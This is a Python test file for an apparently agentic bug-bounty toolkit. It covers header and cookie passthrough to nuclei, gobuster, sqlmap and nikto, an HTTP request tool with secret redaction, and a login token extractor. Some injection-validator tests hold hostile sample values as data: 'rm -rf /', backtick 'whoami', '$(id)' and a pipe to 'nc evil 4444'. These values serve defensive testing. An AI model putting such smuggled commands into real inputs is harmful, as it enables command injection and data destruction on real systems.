"""Tests for authenticated scanning support + the http_request tool (bug-bounty).

- Auth passthrough: nuclei (vulnerability_scan) and gobuster (web_content_discovery)
  accept headers/cookie and inject them safely, rejecting shell metacharacters.
- http_request: general HTTP primitive for manual verification (method/URL
  validation, header parsing, secret redaction). httpx is mocked.
"""

import httpx
import pytest

from quarr.tools import api_security as api
from quarr.tools import registry as reg

# =========================================================================== #
# Auth passthrough on core web scanners
# =========================================================================== #

@pytest.mark.unit
class TestAuthPassthrough:
    def _capture(self, monkeypatch):
        cap = {}
        monkeypatch.setattr(reg, "_run_command", lambda cmd, timeout=180: cap.setdefault("cmd", cmd) or "OK")
        return cap

    def test_nuclei_adds_auth_header_and_cookie(self, monkeypatch):
        cap = self._capture(monkeypatch)
        reg.vulnerability_scan("http://t/", headers="Authorization: Bearer abc123", cookie="session=xyz")
        assert "-H 'Authorization: Bearer abc123'" in cap["cmd"]
        assert "-H 'Cookie: session=xyz'" in cap["cmd"]

    def test_nuclei_without_auth_unchanged(self, monkeypatch):
        cap = self._capture(monkeypatch)
        reg.vulnerability_scan("http://t/")
        assert "-H " not in cap["cmd"]

    def test_nuclei_rejects_header_injection(self):
        out = reg.vulnerability_scan("http://t/", headers="X: y; rm -rf /")
        assert "[ERROR]" in out and "metacharacter" in out

    def test_gobuster_adds_header_and_cookie(self, monkeypatch):
        cap = self._capture(monkeypatch)
        reg.web_content_discovery("http://t/", headers="Authorization: Bearer abc", cookie="sess=1")
        assert "-H 'Authorization: Bearer abc'" in cap["cmd"]
        assert "-c sess=1" in cap["cmd"]

    def test_gobuster_rejects_cookie_injection(self):
        out = reg.web_content_discovery("http://t/", cookie="a=b`whoami`")
        assert "[ERROR]" in out and "metacharacter" in out

    def test_header_validator_requires_colon(self):
        with pytest.raises(ValueError):
            reg._validate_header("no-colon-here")


@pytest.mark.unit
class TestSqlmapNiktoAuth:
    def test_sqlmap_adds_cookie_and_headers(self):
        from quarr.core.validators.command import validate_argv
        from quarr.tools.integrations.sqlmap import SqlmapIntegration
        argv = SqlmapIntegration().build_command(
            target="http://t/p?id=1", cookie="session=abc", headers="Authorization: Bearer x.y.z")
        assert "--cookie" in argv and "session=abc" in argv
        assert "--headers" in argv and "Authorization: Bearer x.y.z" in argv
        validate_argv(argv)  # header spaces must pass the validator

    def test_nikto_adds_cookie_header(self):
        from quarr.core.validators.command import validate_argv
        from quarr.tools.integrations.nikto import NiktoIntegration
        argv = NiktoIntegration().build_command(target="http://t/", cookie="s=1", headers="X-Api: k")
        assert "Cookie: s=1" in argv and "X-Api: k" in argv
        validate_argv(argv)

    def test_header_value_blocks_injection(self):
        from quarr.core.exceptions import ArgumentValidationError
        from quarr.core.validators.command import validate_header_arg
        for bad in ["X: y`whoami`", "X: y|nc evil 4444", "X: y$(id)", "X: y>out"]:
            with pytest.raises(ArgumentValidationError):
                validate_header_arg(bad)

    def test_header_value_allows_normal_auth(self):
        from quarr.core.validators.command import validate_header_arg
        assert validate_header_arg("Authorization: Bearer eyJ.abc.def") == "Authorization: Bearer eyJ.abc.def"
        assert validate_header_arg("session=abc; role=user") == "session=abc; role=user"


# =========================================================================== #
# http_request tool
# =========================================================================== #

def _resp(status=200, text="ok", headers=None):
    req = httpx.Request("GET", "http://x")
    return httpx.Response(status, text=text, headers=headers or {}, request=req)


@pytest.mark.unit
class TestHttpRequest:
    def test_rejects_bad_method(self):
        assert "[ERROR]" in api.http_request("EVIL", "http://x")

    def test_rejects_bad_url(self):
        assert "[ERROR]" in api.http_request("GET", "not a url")

    def test_get_returns_status_and_headers(self, monkeypatch):
        monkeypatch.setattr(httpx, "request",
                            lambda *a, **k: _resp(200, "hello", {"content-type": "text/html"}))
        out = api.http_request("GET", "http://site/page")
        assert "Status: 200" in out
        assert "content-type: text/html" in out
        assert "hello" in out

    def test_parses_headers_and_cookie(self, monkeypatch):
        seen = {}

        def fake_request(method, url, headers=None, content=None, timeout=20.0, follow_redirects=False):
            seen.update(headers or {})
            seen["_method"] = method
            return _resp(200, "ok")

        monkeypatch.setattr(httpx, "request", fake_request)
        api.http_request("POST", "http://site/api",
                         headers="Authorization: Bearer T;;X-Api: 9", cookie="session=abc", body='{"x":1}')
        assert seen["_method"] == "POST"
        assert seen.get("Authorization") == "Bearer T"
        assert seen.get("X-Api") == "9"
        assert seen.get("Cookie") == "session=abc"

    def test_body_is_sent(self, monkeypatch):
        captured = {}

        def fake_request(method, url, headers=None, content=None, timeout=20.0, follow_redirects=False):
            captured["content"] = content
            return _resp(200, "ok")

        monkeypatch.setattr(httpx, "request", fake_request)
        api.http_request("PUT", "http://site/x", body='{"password":"p"}')
        assert captured["content"] == b'{"password":"p"}'

    def test_response_body_secrets_redacted(self, monkeypatch):
        monkeypatch.setattr(httpx, "request",
                            lambda *a, **k: _resp(200, 'token: ghp_' + 'A' * 30))
        out = api.http_request("GET", "http://site/")
        assert "ghp_" + "A" * 30 not in out
        assert "REDACTED" in out

    def test_network_error_handled(self, monkeypatch):
        def boom(*a, **k):
            raise httpx.ConnectError("refused")
        monkeypatch.setattr(httpx, "request", boom)
        out = api.http_request("GET", "http://site/")
        assert "[ERROR]" in out and "failed" in out.lower()

    def test_registered_in_registry(self):
        assert "http_request" in reg.TOOL_REGISTRY


@pytest.mark.unit
class TestWebLogin:
    def test_extracts_json_token(self, monkeypatch):
        monkeypatch.setattr(httpx, "post",
                            lambda *a, **k: _resp(200, '{"auth_token": "eyJabc.def.ghi"}',
                                                  {"content-type": "application/json"}))
        out = api.web_login("http://s/login", "u", "p")
        assert "Token found" in out
        assert "Authorization: Bearer eyJabc.def.ghi" in out

    def test_extracts_nested_token(self, monkeypatch):
        monkeypatch.setattr(httpx, "post",
                            lambda *a, **k: _resp(200, '{"data": {"access_token": "T123"}}'))
        out = api.web_login("http://s/login", "u", "p")
        assert "Bearer T123" in out

    def test_extracts_set_cookie(self, monkeypatch):
        monkeypatch.setattr(httpx, "post",
                            lambda *a, **k: _resp(200, "{}", {"set-cookie": "session=abc; Path=/; HttpOnly"}))
        out = api.web_login("http://s/login", "u", "p")
        assert "session=abc" in out
        assert "use as cookie" in out

    def test_login_failure_flagged(self, monkeypatch):
        monkeypatch.setattr(httpx, "post", lambda *a, **k: _resp(401, '{"error":"bad creds"}'))
        out = api.web_login("http://s/login", "u", "wrong")
        assert "likely failed" in out

    def test_rejects_bad_url(self):
        assert "[ERROR]" in api.web_login("not a url", "u", "p")

    def test_rejects_bad_mode(self):
        assert "[ERROR]" in api.web_login("http://s/login", "u", "p", mode="soap")

    def test_web_login_registered(self):
        assert "web_login" in reg.TOOL_REGISTRY
